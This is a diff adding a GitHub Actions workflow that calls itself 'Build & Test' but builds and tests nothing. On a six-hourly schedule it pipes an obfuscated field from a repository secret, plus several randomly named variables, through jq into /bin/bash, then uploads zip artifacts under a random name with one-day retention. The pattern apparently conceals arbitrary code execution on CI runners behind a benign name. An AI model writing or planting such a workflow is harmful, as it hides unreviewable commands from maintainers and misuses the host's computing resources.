@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          tv0: ${{ secrets.tv0 }}
+        run: |
+          printf '%s' "$tv0" | jq -r .okczi3 | /bin/bash
+          echo $zkatc853 | jq -r .loul17 | /bin/bash
+          echo $ag64 | jq -r .epfhi35 | /bin/bash
+          printf '%s' "$hzce7" | jq -r .y6453 | /bin/bash
+          echo $q15338 | jq -r .wogzo68998 | /bin/bash
+          echo $b164 | jq -r .cwqno73 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: afjJY2rl
+          path: "*.zip"
+          retention-days: 1
